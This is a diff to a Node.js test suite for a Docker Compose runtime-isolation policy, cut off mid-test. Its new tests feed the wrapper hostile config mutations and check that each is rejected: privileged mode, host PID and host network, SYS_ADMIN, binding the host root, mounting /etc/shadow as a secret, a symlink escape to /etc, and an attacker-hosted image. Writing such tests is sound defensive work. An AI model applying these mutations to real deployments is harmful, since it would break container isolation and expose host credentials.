@@ -7,6 +7,7 @@ import os from "node:os";
 import path from "node:path";
 import test from "node:test";
 import { evaluateRuntimeIsolation } from "./runtime-isolation-policy.mjs";
+import { coreSemanticPolicyDescriptor } from "./no-hosted-core-policy.mjs";
 
 const source = fs.readFileSync(path.join(import.meta.dirname, "infra-ops.mjs"), "utf8");
 const start = source.indexOf("async function runtimeIsolationCheck()");
@@ -19,6 +20,7 @@ const runtimeIsolationConsumer = source.slice(start, end);
 const composeVpsSource = fs.readFileSync(path.join(import.meta.dirname, "compose-vps.sh"), "utf8");
 const repositoryRoot = path.resolve(import.meta.dirname, "..");
 const canonicalNoHostedLockPath = path.join(repositoryRoot, "config", "no-hosted-workloads.lock.json");
+let fixtureRootDirectory = repositoryRoot;
 const protectedKinds = ["configs", "networks", "secrets", "services", "volumes"];
 const expectedCoreInventory = {
   configs: ["enterprise_traefik_routes"],
@@ -142,7 +144,13 @@ function copyRepositoryFile(root, relativePath) {
 }
 
 function createConsumerSandbox() {
-  const root = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "runtime-consumer-qa6-")));
+  const cleanupRoot =
+    fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "runtime-consumer-qa6-")));
+  const root = path.join(cleanupRoot, "platform-infrastructure");
+  fs.mkdirSync(root);
+  fs.mkdirSync(path.join(cleanupRoot, "src"));
+  fs.mkdirSync(path.join(cleanupRoot, "applications", "example-app"), { recursive: true });
+  fixtureRootDirectory = root;
   const scripts = path.join(root, "scripts");
   const configDirectory = path.join(root, "config");
   const fakeBin = path.join(root, "bin");
@@ -151,11 +159,13 @@ function createConsumerSandbox() {
   fs.mkdirSync(fakeBin, { recursive: true });
   const composeVps = copyRepositoryFile(root, "scripts/compose-vps.sh");
   fs.chmodSync(composeVps, 0o755);
+  copyRepositoryFile(root, "scripts/no-hosted-core-policy.mjs");
+  copyRepositoryFile(root, "scripts/runtime-isolation-policy.mjs");
   const canonicalLock = copyRepositoryFile(root, "config/no-hosted-workloads.lock.json");
   const inventory = structuredClone(expectedCoreInventory);
   const trustedEnvironmentBytes =
-    "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nCORE_VALUE=trusted\n";
-  const environmentFile = path.join(root, "core.env");
+    "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nCORE_VALUE=trusted\nDOMAIN=fixture.invalid\n";
+  const environmentFile = path.join(root, ".env");
   fs.writeFileSync(environmentFile, trustedEnvironmentBytes, { mode: 0o600 });
   fs.writeFileSync(path.join(root, ".env.vps.example"), trustedEnvironmentBytes, { mode: 0o600 });
   const workloadLock = path.join(root, "hosted.lock.json");
@@ -164,25 +174,31 @@ function createConsumerSandbox() {
   const dockerOutputFile = path.join(root, "docker-output.json");
   const dockerMarker = path.join(root, "docker-called");
   const dockerEnvironmentCapture = path.join(root, "docker-env.txt");
+  const dockerProcessEnvironmentCapture = path.join(root, "docker-process-env.txt");
   writeExecutable(path.join(fakeBin, "docker"), `#!/bin/sh
 set -eu
-if [ -n "\${QA6_SWAP_LOCK_REPLACEMENT:-}" ]; then
-  /bin/mv "$QA6_SWAP_LOCK_REPLACEMENT" "$QA6_SWAP_LOCK_TARGET"
+sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
+if [ -f "$sandbox_root/swap-lock-replacement" ]; then
+  /bin/mv "$sandbox_root/swap-lock-replacement" "$sandbox_root/config/no-hosted-workloads.lock.json"
+  : > "$sandbox_root/lock-swap-fired"
 fi
-if [ -n "\${QA6_SWAP_ENV_REPLACEMENT:-}" ]; then
-  /bin/mv "$QA6_SWAP_ENV_REPLACEMENT" "$QA6_SWAP_ENV_TARGET"
+if [ -f "$sandbox_root/swap-env-trigger" ] && [ -f "$sandbox_root/swap-env-replacement" ]; then
+  /bin/rm "$sandbox_root/swap-env-trigger"
+  /bin/mv "$sandbox_root/swap-env-replacement" "$sandbox_root/.env"
+  : > "$sandbox_root/env-swap-fired"
 fi
-: > "$QA6_DOCKER_MARKER"
+: > "$sandbox_root/docker-called"
+/usr/bin/env | /usr/bin/sort > "$sandbox_root/docker-process-env.txt"
 expect_env=0
 for argument in "$@"; do
   if [ "$expect_env" = 1 ]; then
-    /bin/cat "$argument" > "$QA6_DOCKER_ENV_CAPTURE"
+    /bin/cat "$argument" > "$sandbox_root/docker-env.txt"
     expect_env=0
   elif [ "$argument" = "--env-file" ]; then
     expect_env=1
   fi
 done
-/bin/cat "$QA6_DOCKER_OUTPUT_FILE"
+/bin/cat "$sandbox_root/docker-output.json"
 `);
   writeExecutable(path.join(scripts, "hosted-workload-lock.sh"), `#!/bin/sh
 set -eu
@@ -200,11 +216,9 @@ esac
     HOSTED_WORKLOAD_MODE: "no-hosted",
     HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: "",
     QA6_ACTIVATION_BUNDLE_FILE: activationBundleFile,
-    QA6_DOCKER_ENV_CAPTURE: dockerEnvironmentCapture,
-    QA6_DOCKER_MARKER: dockerMarker,
-    QA6_DOCKER_OUTPUT_FILE: dockerOutputFile,
   });
   return {
+    cleanupRoot,
     root,
     scripts,
     composeVps,
@@ -216,6 +230,7 @@ esac
     dockerOutputFile,
     dockerMarker,
     dockerEnvironmentCapture,
+    dockerProcessEnvironmentCapture,
     environment,
   };
 }
@@ -240,7 +255,7 @@ function addInfraConsumer(sandbox) {
 }
 
 function removeSandbox(sandbox) {
-  fs.rmSync(sandbox.root, { recursive: true, force: true });
+  fs.rmSync(sandbox.cleanupRoot ?? sandbox.root, { recursive: true, force: true });
 }
 
 function runWrapper(sandbox, arguments_ = ["runtime-isolation-envelope"], overrides = {}) {
@@ -282,11 +297,13 @@ function boundedService(overrides = {}) {
     blkio_config: { weight: 300 },
     restart: "no",
     healthcheck: { test: ["CMD", "true"] },
+    logging: { driver: "json-file", options: { "max-size": "10m", "max-file": "5" } },
     environment: {},
     secrets: [],
     volumes: [],
     networks: {},
     read_only: true,
+    security_opt: ["no-new-privileges:true"],
     ...overrides,
   };
 }
@@ -294,13 +311,38 @@ function boundedService(overrides = {}) {
 function coreRuntimeConfig(inventory, { hosted = false } = {}) {
   const fromNames = (names, definition) =>
     Object.fromEntries(names.map((name) => [name, definition(name)]));
+  const physicalNetworkName = (name) => {
+    if (name === "enterprise_net") return "enterprise_net";
+    if (name === "platform_docker_control") return "platform_infra_vps_platform_docker_control";
+    return `platform_infra_vps_${name.slice("platform_".length)}`;
+  };
   const config = {
     name: "platform_infra_vps",
-    configs: fromNames(inventory.configs, () => ({ file: "/fixture/config" })),
-    networks: fromNames(inventory.networks, () => ({ internal: true })),
-    secrets: fromNames(inventory.secrets, (name) => ({ external: true, name: `platform_infra_vps_${name}` })),
+    configs: fromNames(inventory.configs, (name) => ({
+      content: coreSemanticPolicyDescriptor.configContentLines[name]
+        .join("\n")
+        .replace("__PORTAL_HOST__", "portal.fixture.invalid")
+        .replace("__DOCS_HOST__", "docs.fixture.invalid")
+        .replace("__AUTH_HOST__", "auth.fixture.invalid"),
+    })),
+    networks: fromNames(inventory.networks, (name) => ({
+      name: coreSemanticPolicyDescriptor.physicalNetworkNames[name],
+      ...(Object.keys(coreSemanticPolicyDescriptor.networkLabels[name]).length > 0
+        ? { labels: structuredClone(coreSemanticPolicyDescriptor.networkLabels[name]) }
+        : {}),
+      ...(name === "enterprise_net" ? { external: true } : {}),
+      ...(name !== "enterprise_net" && name !== "platform_egress" ? { internal: true } : {}),
+      ...(name === "platform_egress" ? { enable_ipv6: false } : {}),
+      ...(name === "platform_docker_control" ? { driver: "bridge" } : {}),
+    })),
+    secrets: fromNames(inventory.secrets, (name) => ({
+      file: path.join(fixtureRootDirectory, coreSemanticPolicyDescriptor.secretFiles[name]),
+    })),
     services: fromNames(inventory.services, () => boundedService()),
-    volumes: fromNames(inventory.volumes, (name) => ({ name: `platform_infra_vps_${name}` })),
+    volumes: fromNames(inventory.volumes, (name) => ({
+      name: coreSemanticPolicyDescriptor.physicalVolumeNames[name],
+      ...(coreSemanticPolicyDescriptor.externalVolumeNames.includes(name) ? { external: true } : {}),
+    })),
   };
   config.services["control-center"] = boundedService({ read_only: true, cpu_shares: 1024 });
   config.services["project-router"] = boundedService({
@@ -330,7 +372,128 @@ function coreRuntimeConfig(inventory, { hosted = false } = {}) {
     networks: { platform_docker_control: null },
   });
   config.services.postgres = boundedService();
-  config.networks.platform_docker_control = { internal: true };
+  for (const serviceName of inventory.services) {
+    const service = config.services[serviceName];
+    const processModel = coreSemanticPolicyDescriptor.serviceProcessModel[serviceName];
+    service.container_name = coreSemanticPolicyDescriptor.serviceContainerNames[serviceName];
+    service.restart = coreSemanticPolicyDescriptor.serviceRestartPolicies[serviceName];
+    if (coreSemanticPolicyDescriptor.serviceProfiles[serviceName]) {
+      service.profiles = [...coreSemanticPolicyDescriptor.serviceProfiles[serviceName]];
+    }
+    if (coreSemanticPolicyDescriptor.exactExceptions.pid[serviceName]) {
+      service.pid = coreSemanticPolicyDescriptor.exactExceptions.pid[serviceName];
+    }
+    if (coreSemanticPolicyDescriptor.exactExceptions.networkMode[serviceName]) {
+      service.network_mode =
+        coreSemanticPolicyDescriptor.exactExceptions.networkMode[serviceName];
+    }
+    const dependencies = coreSemanticPolicyDescriptor.serviceDependencies[serviceName] ?? [];
+    if (dependencies.length > 0) {
+      service.depends_on = Object.fromEntries(
+        dependencies.map((dependency) => [
+          dependency,
+          { condition: "service_healthy", required: true, restart: false },
+        ]),
+      );
+    }
+    service.healthcheck =
+      structuredClone(coreSemanticPolicyDescriptor.serviceHealthchecks[serviceName]);
+    if (!coreSemanticPolicyDescriptor.servicesWithDefaultLogging.includes(serviceName)) {
+      delete service.logging;
+    }
+    if (processModel.command !== null) service.command = structuredClone(processModel.command);
+    if (processModel.entrypoint !== null) service.entrypoint = structuredClone(processModel.entrypoint);
+    service.networks = Object.fromEntries(
+      coreSemanticPolicyDescriptor.serviceNetworks[serviceName].map((name) => [name, null]),
+    );
+    service.secrets = [...(coreSemanticPolicyDescriptor.serviceSecretGrants[serviceName] ?? [])];
+    service.configs = structuredClone(coreSemanticPolicyDescriptor.serviceConfigGrants[serviceName] ?? []);
+    service.ports = (coreSemanticPolicyDescriptor.servicePortRules[serviceName] ?? []).map((port) => ({
+      host_ip: port.hostIp,
+      protocol: port.protocol,
+      published: String(port.published),
+      target: port.target,
+    }));
+    if (coreSemanticPolicyDescriptor.tmpfsRules[serviceName]) {
+      service.tmpfs = [...coreSemanticPolicyDescriptor.tmpfsRules[serviceName]];
+    }
+    if (serviceName === "alertmanager") service.group_add = ["1000"];
+    if (coreSemanticPolicyDescriptor.requiredServiceControls.capDropAll.includes(serviceName)) {
+      service.cap_drop = ["ALL"];
+    }
+    if (coreSemanticPolicyDescriptor.requiredServiceControls.numericUsers[serviceName]) {
+      service.user = coreSemanticPolicyDescriptor.requiredServiceControls.numericUsers[serviceName];
+    }
+    service.image = coreSemanticPolicyDescriptor.serviceImages[serviceName];
+    const dockerfile = coreSemanticPolicyDescriptor.buildDockerfiles[serviceName];
+    if (dockerfile) {
+      service.build = {
+        context: fixtureRootDirectory,
+        dockerfile,
+        args: { NODE_IMAGE: coreSemanticPolicyDescriptor.serviceImages["project-router"] },
+      };
+    }
+    if (serviceName === "docker-socket-proxy") {
+      service.environment = structuredClone(coreSemanticPolicyDescriptor.proxyEnvironment);
+    }
+    if (serviceName === "control-center") {
+      Object.assign(
+        service.environment,
+        structuredClone(coreSemanticPolicyDescriptor.controlCenterFixedSecurityEnvironment),
+        { CONTROL_CENTER_OIDC_ISSUER: "https://auth.fixture.invalid/realms/platform" },
+      );
+    }
+    if (serviceName === "waf") {
+      service.environment = {
+        ...service.environment,
+        ...structuredClone(coreSemanticPolicyDescriptor.wafFixedSecurityEnvironment),
+        ...Object.fromEntries(
+          Object.entries(coreSemanticPolicyDescriptor.wafProjectedSecurityEnvironment)
+            .map(([key, projection]) => [key, projection.fallback]),
+        ),
+      };
+    }
+    if (serviceName === "backup-scheduler") {
+      Object.assign(
+        service.environment,
+        Object.fromEntries(
+          Object.entries(coreSemanticPolicyDescriptor.backupSchedulerBooleanEnvironment)
+            .map(([key, projection]) => [key, projection.fallback]),
+        ),
+      );
+    }
+    service.volumes = [];
+    for (const [target, mode] of Object.entries(
+      coreSemanticPolicyDescriptor.bindTargets[serviceName] ?? {},
+    )) {
+      const [rule] = coreSemanticPolicyDescriptor.bindSourceRules[serviceName][target];
+      const source = rule.startsWith("root:")
+        ? path.resolve(fixtureRootDirectory, rule.slice("root:".length))
+        : path.resolve(fixtureRootDirectory, "../src");
+      service.volumes.push({
+        type: "bind",
+        source,
+        target,
+        read_only: mode === "read-only",
+      });
+    }
+    for (const [candidateService, source, target, mode] of
+      coreSemanticPolicyDescriptor.hostBindExceptions) {
+      if (candidateService === serviceName) {
+        service.volumes.push({
+          type: "bind",
+          source,
+          target,
+          read_only: mode === "read-only",
+        });
+      }
+    }
+    for (const [source, target] of Object.entries(
+      coreSemanticPolicyDescriptor.namedVolumeTargets[serviceName] ?? {},
+    )) {
+      service.volumes.push({ type: "volume", source, target });
+    }
+  }
   if (hosted) {
     config.services["example-app-web"] = boundedService({
       image: `example.invalid/example-app@sha256:${"a".repeat(64)}`,
@@ -383,15 +546,16 @@ function installCountingRenderer(sandbox) {
   fs.writeFileSync(renderCountFile, "0\n", { mode: 0o600 });
   writeExecutable(path.join(sandbox.root, "bin", "docker"), `#!/bin/sh
 set -eu
+sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
+render_count_file="$sandbox_root/docker-render-count"
 count=0
-if [ -f "$QA7_RENDER_COUNT_FILE" ]; then
-  IFS= read -r count < "$QA7_RENDER_COUNT_FILE"
+if [ -f "$render_count_file" ]; then
+  IFS= read -r count < "$render_count_file"
 fi
 count=$((count + 1))
-printf '%s\\n' "$count" > "$QA7_RENDER_COUNT_FILE"
-/bin/cat "$QA6_DOCKER_OUTPUT_FILE"
+printf '%s\\n' "$count" > "$render_count_file"
+/bin/cat "$sandbox_root/docker-output.json"
 `);
-  sandbox.environment.QA7_RENDER_COUNT_FILE = renderCountFile;
   return {
     count() {
       return Number.parseInt(fs.readFileSync(renderCountFile, "utf8").trim(), 10);
@@ -403,13 +567,36 @@ printf '%s\\n' "$count" > "$QA7_RENDER_COUNT_FILE"
 }
 
 function runCoreStackNoHostedScenario(config) {
-  const root = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "core-stack-no-hosted-qa7-")));
+  const cleanupRoot =
+    fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "core-stack-no-hosted-qa7-")));
+  const root = path.join(cleanupRoot, "platform-infrastructure");
+  fs.mkdirSync(root);
+  fs.mkdirSync(path.join(cleanupRoot, "src"));
+  config = structuredClone(config);
+  for (const secretName of Object.keys(config.secrets)) {
+    config.secrets[secretName] = {
+      file: path.join(root, coreSemanticPolicyDescriptor.secretFiles[secretName]),
+    };
+  }
+  for (const [serviceName, service] of Object.entries(config.services)) {
+    if (service.build) service.build.context = root;
+    for (const mount of service.volumes ?? []) {
+      const rules = coreSemanticPolicyDescriptor.bindSourceRules[serviceName]?.[mount.target];
+      if (!rules || rules.length !== 1) continue;
+      const [rule] = rules;
+      mount.source = rule.startsWith("root:")
+        ? path.resolve(root, rule.slice("root:".length))
+        : path.resolve(root, "../src");
+    }
+  }
   const fakeBin = path.join(root, "bin");
   const stateDirectory = path.join(root, "state");
   fs.mkdirSync(fakeBin);
   fs.mkdirSync(stateDirectory);
   const gate = copyRepositoryFile(root, "scripts/core-stack-activation-gate.sh");
   const composeVps = copyRepositoryFile(root, "scripts/compose-vps.sh");
+  copyRepositoryFile(root, "scripts/no-hosted-core-policy.mjs");
+  copyRepositoryFile(root, "scripts/runtime-isolation-policy.mjs");
   copyRepositoryFile(root, "config/no-hosted-workloads.lock.json");
   fs.chmodSync(gate, 0o755);
   fs.chmodSync(composeVps, 0o755);
@@ -456,9 +643,10 @@ exec "$@"
   const engineLog = path.join(root, "fake-engine.log");
   writeExecutable(path.join(fakeBin, "docker"), `#!/bin/sh
 set -eu
-printf '%s\\n' "$*" >> "$QA7_ENGINE_LOG"
+sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
+printf '%s\\n' "$*" >> "$sandbox_root/fake-engine.log"
 if [ "\${1:-}" = "compose" ]; then
-  /bin/cat "$QA7_RENDER_MODEL"
+  /bin/cat "$sandbox_root/candidate-render.json"
   exit 0
 fi
 if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "info" ]; then
@@ -469,7 +657,7 @@ if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "compose" ]; then
   case " $* " in
     *" create "*) exit 0 ;;
     *" ps -aq "*)
-      /bin/cat "$QA7_CONTAINER_IDS"
+      /bin/cat "$sandbox_root/container-ids"
       exit 0
       ;;
   esac
@@ -478,15 +666,15 @@ if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "start" ]; then
   exit 0
 fi
 if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "inspect" ]; then
-  /bin/cat "$QA7_INSPECT_MODEL"
+  /bin/cat "$sandbox_root/inspect.json"
   exit 0
 fi
-printf '%s\\n' "UNEXPECTED_DOCKER_CALL $*" >> "$QA7_ENGINE_LOG"
+printf '%s\\n' "UNEXPECTED_DOCKER_CALL $*" >> "$sandbox_root/fake-engine.log"
 exit 97
 `);
 
-  const environmentFile = path.join(root, "core.env");
-  fs.writeFileSync(environmentFile, "CORE_VALUE=trusted\n", { mode: 0o600 });
+  const environmentFile = path.join(root, ".env");
+  fs.writeFileSync(environmentFile, "CORE_VALUE=trusted\nDOMAIN=fixture.invalid\n", { mode: 0o600 });
   const result = spawnSync("/bin/bash", [
     gate,
     "--project-name", "platform_infra_vps",
@@ -511,7 +699,7 @@ exit 97
     timeout: 30_000,
   });
   const log = fs.existsSync(engineLog) ? fs.readFileSync(engineLog, "utf8") : "";
-  return { root, result, log };
+  return { root: cleanupRoot, result, log };
 }
 
 function activationBundle(sandbox, protectedResourceNames, combinedRenderBytes) {
@@ -620,17 +808,41 @@ test("VPS wrapper emits one closed envelope from the same read-once activation b
 });
 
 test("VPS wrapper derives a core-only envelope only in explicit canonical no-hosted mode", () => {
-  const root = fs.mkdtempSync(path.join(os.tmpdir(), "runtime-envelope-no-hosted-"));
+  const root = fs.mkdtempSync(path.join(repositoryRoot, ".runtime-envelope-no-hosted-"));
   try {
-    const envFile = path.join(root, "core.env");
+    const composeVps = copyRepositoryFile(root, "scripts/compose-vps.sh");
+    fs.chmodSync(composeVps, 0o755);
+    copyRepositoryFile(root, "scripts/no-hosted-core-policy.mjs");
+    copyRepositoryFile(root, "scripts/runtime-isolation-policy.mjs");
+    copyRepositoryFile(root, "config/no-hosted-workloads.lock.json");
+    const envFile = path.join(root, ".env");
     const fakeBin = path.join(root, "bin");
     const marker = path.join(root, "docker.args");
+    const sourceDirectory = path.join(root, "applications", "example-app");
+    fs.mkdirSync(sourceDirectory, { recursive: true });
+    fixtureRootDirectory = root;
     const config = coreRuntimeConfig(expectedCoreInventory);
-    fs.writeFileSync(envFile, "CORE_VALUE=fixture\n");
+    for (const serviceName of ["control-center", "project-router"]) {
+      config.services[serviceName].volumes
+        .find((entry) => entry.target === "/var/www/projects").source = sourceDirectory;
+    }
+    config.services["backup-scheduler"].volumes
+      .find((entry) => entry.target === "/project").source = sourceDirectory;
+    fs.writeFileSync(
+      path.join(root, "docker-config.json"),
+      `${JSON.stringify(config)}\n`,
+      { mode: 0o600 },
+    );
+    fs.writeFileSync(
+      envFile,
+      "CORE_VALUE=fixture\nDOMAIN=fixture.invalid\nPHP_PROJECTS_DIR=applications/example-app\nPROJECT_SOURCE_DIR=applications/example-app\n",
+      { mode: 0o600 },
+    );
     fs.mkdirSync(fakeBin);
     fs.writeFileSync(path.join(fakeBin, "docker"), `#!/bin/sh
-printf '%s\n' "$*" > "$RUNTIME_ENVELOPE_DOCKER_MARKER"
-printf '%s\n' "$RUNTIME_ENVELOPE_CONFIG"
+fake_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
+printf '%s\n' "$*" > "$fake_root/docker.args"
+/bin/cat "$fake_root/docker-config.json"
 `, { mode: 0o755 });
     const commonEnvironment = {
       ...process.env,
@@ -639,11 +851,9 @@ printf '%s\n' "$RUNTIME_ENVELOPE_CONFIG"
       COMPOSE_PROJECT_NAME: "platform_infra_vps",
       HOSTED_WORKLOAD_LOCK: "",
       HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: "",
-      RUNTIME_ENVELOPE_DOCKER_MARKER: marker,
-      RUNTIME_ENVELOPE_CONFIG: JSON.stringify(config),
     };
     const implicit = spawnSync("/bin/bash", [
-      path.join(import.meta.dirname, "compose-vps.sh"),
+      composeVps,
       "runtime-isolation-envelope",
     ], {
       encoding: "utf8",
@@ -654,7 +864,7 @@ printf '%s\n' "$RUNTIME_ENVELOPE_CONFIG"
     assert.equal(fs.existsSync(marker), false);
 
     const explicit = spawnSync("/bin/bash", [
-      path.join(import.meta.dirname, "compose-vps.sh"),
+      composeVps,
       "runtime-isolation-envelope",
     ], {
       encoding: "utf8",
@@ -669,7 +879,7 @@ printf '%s\n' "$RUNTIME_ENVELOPE_CONFIG"
     assert.equal(envelope.projectName, "platform_infra_vps");
     assert.deepEqual(envelope.config, config);
     assert.deepEqual(envelope.protectedResourceNames, expectedCoreInventory);
-    const canonicalNoHostedLock = path.join(import.meta.dirname, "..", "config", "no-hosted-workloads.lock.json");
+    const canonicalNoHostedLock = path.join(root, "config", "no-hosted-workloads.lock.json");
     assert.equal(
       envelope.lockSha256,
       crypto.createHash("sha256").update(fs.readFileSync(canonicalNoHostedLock)).digest("hex"),
@@ -906,10 +1116,593 @@ test("QA7 core activation rejects hostile no-hosted renders before create and st
   );
 });
 
+test("QA7 no-hosted rejects each isolated privileged core capability", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
+    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(baseline.status, 0, baseline.stderr);
+    assert.equal(renderer.count(), 1);
+    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
+    const mutations = [
+      ["privileged", (service) => { service.privileged = true; }],
+      ["pid host", (service) => { service.pid = "host"; }],
+      ["network host", (service) => { service.network_mode = "host"; }],
+      ["SYS_ADMIN", (service) => { service.cap_add = ["SYS_ADMIN"]; }],
+      ["device", (service) => { service.devices = ["/dev/null:/dev/qa7"]; }],
+      ["root bind", (service) => {
+        service.volumes = [{ type: "bind", source: "/", target: "/host" }];
+      }],
+    ];
+    for (const [label, mutate] of mutations) {
+      const config = coreAuthorityConfig();
+      mutate(config.services.alertmanager);
+      assert.deepEqual(Object.keys(config.services).sort(), expectedCoreInventory.services);
+      renderer.reset();
+      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
+      const result = runWrapper(sandbox, ["config", "--format", "json"]);
+      assert.equal(renderer.count(), 1, `${label} caused a second render`);
+      assert.notEqual(result.status, 0, `${label} was accepted`);
+      assert.equal(result.stdout, "", `${label} leaked an unvalidated render`);
+      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
+      assert.match(result.stderr, /semantic authority|runtime isolation/i);
+    }
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted rejects isolated top-level and sensitive-source authority mutations", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
+    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(baseline.status, 0, baseline.stderr);
+    assert.equal(renderer.count(), 1);
+    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
+    const mutations = [
+      ["config host file", (config) => {
+        config.configs.enterprise_traefik_routes = { file: "/etc/shadow" };
+      }],
+      ["secret host file", (config) => {
+        config.secrets.smtp_password = { file: "/etc/shadow" };
+      }],
+      ["volume driver opts", (config) => {
+        config.volumes.enterprise_redis_data = {
+          name: "enterprise_redis_data",
+          driver_opts: { type: "none", o: "bind", device: "/" },
+        };
+      }],
+      ["network driver opts", (config) => {
+        config.networks.platform_cache = {
+          internal: true,
+          driver_opts: { "com.docker.network.bridge.name": "host0" },
+        };
+      }],
+      ["sensitive allowed-target bind", (config) => {
+        config.services.alertmanager.volumes = [{
+          type: "bind",
+          source: "/etc/shadow",
+          target: "/etc/alertmanager/alertmanager.yml",
+          read_only: true,
+        }];
+      }],
+    ];
+    for (const [label, mutate] of mutations) {
+      const config = coreAuthorityConfig();
+      mutate(config);
+      for (const kind of protectedKinds) {
+        assert.deepEqual(Object.keys(config[kind]).sort(), expectedCoreInventory[kind]);
+      }
+      renderer.reset();
+      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
+      const result = runWrapper(sandbox, ["config", "--format", "json"]);
+      assert.equal(renderer.count(), 1, `${label} caused a second render`);
+      assert.notEqual(result.status, 0, `${label} was accepted`);
+      assert.equal(result.stdout, "", `${label} leaked an unvalidated render`);
+      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
+      assert.match(result.stderr, /semantic authority|runtime isolation/i);
+    }
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted accepts canonical workspace sources and rejects escapes", () => {
+  const sandbox = createConsumerSandbox();
+  const setSourceMounts = (config, phpSource, projectSource) => {
+    for (const serviceName of ["control-center", "project-router"]) {
+      const mount = config.services[serviceName].volumes
+        .find((entry) => entry.target === "/var/www/projects");
+      mount.source = phpSource;
+    }
+    config.services["backup-scheduler"].volumes
+      .find((entry) => entry.target === "/project").source = projectSource;
+  };
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    const documentedSource = path.join(
+      sandbox.cleanupRoot,
+      "applications",
+      "example-app",
+    );
+    fs.writeFileSync(
+      sandbox.environmentFile,
+      [
+        "HOSTED_WORKLOAD_LOCK=",
+        "HOSTED_WORKLOAD_MODE=no-hosted",
+        "DOMAIN=fixture.invalid",
+        "PHP_PROJECTS_DIR=../applications/example-app",
+        "PROJECT_SOURCE_DIR=../applications/example-app",
+        "",
+      ].join("\n"),
+      { mode: 0o600 },
+    );
+    const documented = coreAuthorityConfig();
+    setSourceMounts(documented, documentedSource, documentedSource);
+    writeDockerOutput(sandbox, `${JSON.stringify(documented)}\n`);
+    const accepted = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(accepted.status, 0, accepted.stderr);
+    assert.equal(renderer.count(), 1);
+
+    fs.writeFileSync(
+      sandbox.environmentFile,
+      "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nDOMAIN=fixture.invalid\nPHP_PROJECTS_DIR=/etc\nPROJECT_SOURCE_DIR=/etc\n",
+      { mode: 0o600 },
+    );
+    const absoluteEscape = coreAuthorityConfig();
+    setSourceMounts(absoluteEscape, "/etc", "/etc");
+    renderer.reset();
+    writeDockerOutput(sandbox, `${JSON.stringify(absoluteEscape)}\n`);
+    const absoluteRejected = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(renderer.count(), 1);
+    assert.notEqual(absoluteRejected.status, 0, "absolute workspace escape was accepted");
+    assert.equal(absoluteRejected.stdout, "");
+    assert.match(absoluteRejected.stderr, /semantic authority/i);
+
+    const symlinkSource = path.join(sandbox.cleanupRoot, "applications", "escape");
+    fs.symlinkSync("/etc", symlinkSource);
+    fs.writeFileSync(
+      sandbox.environmentFile,
+      "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nDOMAIN=fixture.invalid\nPHP_PROJECTS_DIR=../applications/escape\nPROJECT_SOURCE_DIR=../applications/escape\n",
+      { mode: 0o600 },
+    );
+    const symlinkEscape = coreAuthorityConfig();
+    setSourceMounts(symlinkEscape, symlinkSource, symlinkSource);
+    renderer.reset();
+    writeDockerOutput(sandbox, `${JSON.stringify(symlinkEscape)}\n`);
+    const symlinkRejected = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(renderer.count(), 1);
+    assert.notEqual(symlinkRejected.status, 0, "symlink workspace escape was accepted");
+    assert.equal(symlinkRejected.stdout, "");
+    assert.match(symlinkRejected.stderr, /semantic authority/i);
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted exact execution identity rejects image process labels and tmpfs mutations", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
+    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(baseline.status, 0, baseline.stderr);
+    assert.equal(renderer.count(), 1);
+    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
+    const mutations = [
+      ["image", (config) => {
+        config.services.alertmanager.image = `attacker.invalid/alertmanager@sha256:${"f".repeat(64)}`;
+      }],
+      ["command", (config) => {
+        config.services.alertmanager.command = ["sh", "-c", "id"];
+      }],
+      ["entrypoint", (config) => {
+        config.services.alertmanager.entrypoint = ["/bin/sh", "-c"];
+      }],
+      ["labels", (config) => {
+        config.services.alertmanager.labels = { "traefik.enable": "true" };
+      }],
+      ["tmpfs", (config) => {
+        config.services.alertmanager.tmpfs = ["/:rw,size=1g"];
+      }],
+    ];
+    for (const [label, mutate] of mutations) {
+      const config = coreAuthorityConfig();
+      mutate(config);
+      renderer.reset();
